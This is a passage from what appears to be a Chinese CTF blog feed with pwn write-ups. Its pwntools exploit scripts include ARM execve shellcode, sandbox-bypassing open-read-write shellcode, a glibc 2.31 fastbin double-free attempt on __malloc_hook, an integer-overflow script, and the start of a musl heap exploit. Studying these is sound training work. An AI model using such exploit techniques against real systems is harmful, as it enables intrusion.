class="hljs-string">&quot;\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode)))<br>buf=<span class="hljs-number">0x99D44</span><br>sea(<span class="hljs-string">&quot;&gt; Try typing something first :\n&quot;</span>,shellcode)<br>sla(<span class="hljs-string">&quot;&gt; Get the FLAG by typing a little :\n&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x38</span>+p32(buf))<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="sandbox">sandbox</h2><blockquote><p>代码有些许复杂，但也不用细究，google一下某些特征语句，和libcapstone.so.5这些库可以大致确定方向，稍微看一下伪代码,结合程序运行可以发现：</p></blockquote><p>它实现了一个反汇编器，会把我们的代码翻译成汇编语言展示出来，并执行</p><p><img src="/2023/01/12/23%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5wp/1.png" alt="1"></p><p>syscall 59也就是系统调用system的话会被检测</p><p>这里a2[20]对应的应该是rax</p><p><img src="/2023/01/12/23%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5wp/2.png" alt="2"></p><p>那我们就用orw读flag</p><p>题目白给了函数实际地址，相当于bss也知道了，但不用也行</p><p><a href="https://tttang.com/archive/1447/#toc_shellcode_3">这么去orw</a></p><blockquote><p>sc = shellcraft.amd64.open(“./flag”)<br>sc += shellcraft.amd64.read(“rax”, “rsp”, 0x100)<br>sc += shellcraft.amd64.write(1, “rsp”, 0x100)</p></blockquote><p><img src="/2023/01/12/23%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5wp/3.png" alt="3"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./sandbox&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br>ru(<span class="hljs-string">&quot;A gift for you : 0x&quot;</span>)<br>bss=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x1572</span>+<span class="hljs-number">0x6000</span><br>info(<span class="hljs-string">&quot;bss&quot;</span>,bss)<br>sla(<span class="hljs-string">&quot;How long do you need to enter ?\n&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x200</span>))<br>sc =asm(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rax, 0x101010101010101</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x101010101010101 ^ 0x67616c662f2e</span><br><span class="hljs-string">    xor [rsp], rax</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    xor edx, edx /* 0 */</span><br><span class="hljs-string">    xor esi, esi /* 0 */</span><br><span class="hljs-string">    /* call open() */</span><br><span class="hljs-string">    push SYS_open /* 2 */</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* call read(&#x27;rax&#x27;, &#x27;rsp&#x27;, 0x100) */</span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    xor eax, eax /* SYS_read */</span><br><span class="hljs-string">    xor edx, edx</span><br><span class="hljs-string">    mov dh, 0x100 &gt;&gt; 8</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    push 1</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    xor edx, edx</span><br><span class="hljs-string">    mov dh, 0x100 &gt;&gt; 8</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    /* call write() */</span><br><span class="hljs-string">    push SYS_write /* 1 */</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br><span class="hljs-comment">#sc = shellcraft.amd64.open(&quot;./flag&quot;)</span><br><span class="hljs-comment">#sc += shellcraft.amd64.read(&quot;rax&quot;, &quot;rsp&quot;, 0x100)</span><br><span class="hljs-comment">#sc += shellcraft.amd64.write(1, &quot;rsp&quot;, 0x100)</span><br><br>info(<span class="hljs-string">&quot;lenth&quot;</span>,<span class="hljs-built_in">len</span>(sc))<br><span class="hljs-built_in">print</span>(sc)<br><span class="hljs-comment">#debug()</span><br>sla(<span class="hljs-string">&quot;Your input : &quot;</span>,sc)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="no-output-不会">no_output(不会)</h2><p>libc2.31保护全开,用的是calloc分配,size限制[0,0x180]，没有show，存在uaf</p><p>我的想法就是用fastbin doublefree，构造堆重叠，伪造个unsortbin，切割unsortbin使main_arena+96地址到和这个unsortbin重叠的fastbin的fd上，然后Partial overwrite改为malloc_hook的地址，分配fastbin到malloc_hook，改为one_gadget，有几个位要爆破一下</p><p>我已经走到最后一步了,也成功改写为og了，就最后触发报错了</p><p><img src="/2023/01/12/23%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5wp/4.png" alt="4"></p><p>本题libc是2.31,查阅资料和对比源码后发现，早在2.29就已经对unsortbin进行了双向链表的细致检查</p><p>而我前面的操作已经破坏了它的链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt;= <span class="hljs-number">2</span> * SIZE_SZ)<br>             || __glibc_unlikely (size &gt; av-&gt;system_mem))<br>           malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid size (unsorted)&quot;</span>);<br>         <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="hljs-number">2</span> * SIZE_SZ)<br>             || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))<br>           malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);<br>         <span class="hljs-keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))<br>           malloc_printerr (<span class="hljs-string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);<br>         <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)<br>             || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))<br>           malloc_printerr (<span class="hljs-string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);<br>         <span class="hljs-keyword">if</span> (__glibc_unlikely (prev_inuse (next)))<br>           malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);<br></code></pre></td></tr></table></figure><p>也就是说这种方法已经走不通了,要么打IO，用什么方法捏</p><p><strong>失败exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;10.10.30.13&#x27;</span>,<span class="hljs-number">30006</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,content</span>):<br>    sla(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&quot;size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&quot;Content: &quot;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    sla(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sea(<span class="hljs-string">&quot;Content: &quot;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>ru(<span class="hljs-string">&quot;gift :\n&quot;</span>)<br>heap_base=uu64(rc(<span class="hljs-number">6</span>))-<span class="hljs-number">0x2a0</span><br>info(<span class="hljs-string">&quot;heap_base&quot;</span>,heap_base)<br><span class="hljs-comment">#-----fill tcache--------</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&quot; &quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(<span class="hljs-number">0</span>)<br>    edit(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span>)<br><span class="hljs-comment">#-----overlap-------</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot; &quot;</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">1</span>,p64(heap_base+<span class="hljs-number">0x350</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x71</span>))<br>edit(<span class="hljs-number">2</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x21</span>))<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&quot; &quot;</span>)<br>edit(<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x71</span>))<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x71</span>))<span class="hljs-comment">#now 5&amp;4 overlap</span><br><span class="hljs-comment">#-----unsortbin----</span><br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&quot; &quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(<span class="hljs-number">6</span>)<br>    edit(<span class="hljs-number">6</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x91</span>))<br>delete(<span class="hljs-number">5</span>)<br><span class="hljs-comment">#--------------------</span><br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot; &quot;</span>)<br>edit(<span class="hljs-number">2</span>,p8(<span class="hljs-number">0x3d</span>))<span class="hljs-comment">#0x7fc218ed9be0-96-0x10-0x33</span><br><span class="hljs-comment">#edit(5,p64(0x20)+p64(0)*2+p64(0x51))</span><br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">b&quot;\x2e\x0b\xe8&quot;</span>)<br>og=[<span class="hljs-number">0xe3b2e</span>,<span class="hljs-number">0xe3b31</span>,<span class="hljs-number">0xe3b34</span>]<br>info(<span class="hljs-string">&quot;__malloc_hook&quot;</span>,libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>])<br>sla(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">10</span>))<br>sla(<span class="hljs-string">&quot;size: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x70</span>))<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数组越界</tag>
      
      <tag>arm</tag>
      
      <tag>shellcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022pwnhub冬季赛pwn</title>
    <link href="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/"/>
    <url>/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><h2 id="justJS">justJS</h2><p>v8 pwn，用别人非预期的方法</p><p>俺啥也不会啥也不懂</p><p>输eval(read(‘flag’))换行再换行能读出flag</p><p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/2.png" alt="2"></p><h2 id="探险者">探险者</h2><p>整数溢出，购买防御，打999级怪,抗20轮获得shell</p><p>150*28633116=0x100000068溢出变为0x68</p><p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/1.png" alt="1"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;47.97.127.1&#x27;</span>,<span class="hljs-number">27768</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br><span class="hljs-comment">#---------------------------3</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    ru(<span class="hljs-string">&quot;HP: &quot;</span>)<br>    num=rc(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">if</span> num==<span class="hljs-string">&quot;15 &quot;</span>:<br>        sl(<span class="hljs-string">&quot;1&quot;</span>)<br>        ru(<span class="hljs-string">&quot;GOLD:  &quot;</span>)<br>        num=rc(<span class="hljs-number">3</span>)<br>        <span class="hljs-keyword">if</span> num==<span class="hljs-string">&quot;200&quot;</span>:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        sl(<span class="hljs-string">&quot;2&quot;</span>)<br>sla(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;28633116&#x27;</span>)<br><span class="hljs-comment">#---------------------------999</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    ru(<span class="hljs-string">&quot;LV: &quot;</span>)<br>    num=rc(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">if</span> num==<span class="hljs-string">&quot;999&quot;</span>:<br>        sl(<span class="hljs-string">&quot;1&quot;</span>)<br>        r.interactive()<br>    <span class="hljs-keyword">else</span>:<br>        sl(<span class="hljs-string">&quot;2&quot;</span>)<br></code></pre></td></tr></table></figure><p>233我纯打游戏写了个脚本，本地行，远端有时间限制，打最后999级的怪最多到round6就给我断了</p><h2 id="heap">heap</h2><p>musl pwn 没接触过，这题就当入门，我分析的很烂，看着乐呵一下就行</p><h3 id="漏洞">漏洞</h3><p>这题全是破绽，可以数组越界，可以堆溢出，free后指针悬挂(不过我还是不太了解在musl中怎么利用)</p><h3 id="利用">利用</h3><p>参考的是<a href="https://wx.zsxq.com/dweb2/index/group/824215518412">nu1l战队在知识星球分享的wp</a>，大致是数组越界达成任意地址读写，用IO打puts来getshell</p><h4 id="1-leak-heap-addr">1.leak heap_addr</h4><p>数组越界show(16)泄露堆地址</p><p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/5.png" alt="5"></p><h4 id="2-leak-pie">2.leak pie</h4><p>填充字符串‘a’，继续配合show(16)泄露pie的偏移</p><p>然后复原一下‘a’覆盖的地址</p><p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/6.png" alt="6"></p><h4 id="3-任意地址读写">3.任意地址读写</h4><p>下标0x390处有个指针指向ptr自己，这样我们就控制了ptr，可以任意地址读写</p><p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/7.png" alt="7"></p><h4 id="4-泄漏libc">4.泄漏libc</h4><p>改ptr指针指向puts的got表，泄漏libc，得到stdout地址</p><h4 id="5-打IO">5.打IO</h4><p>因为musl编译的好像没有malloc_hook,free_hook之类的，就要打IO来getshell</p><p>改ptr指针指向stdout，伪造fakeIO，遇到puts触发getshell</p><p>可以看到最后执行到如图所示</p><p>要执行到这个分支还是要满足一些条件，具体fake_IO要满足哪些条件还是得看源码</p><p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/8.png" alt="8"></p><h3 id="exp">exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span 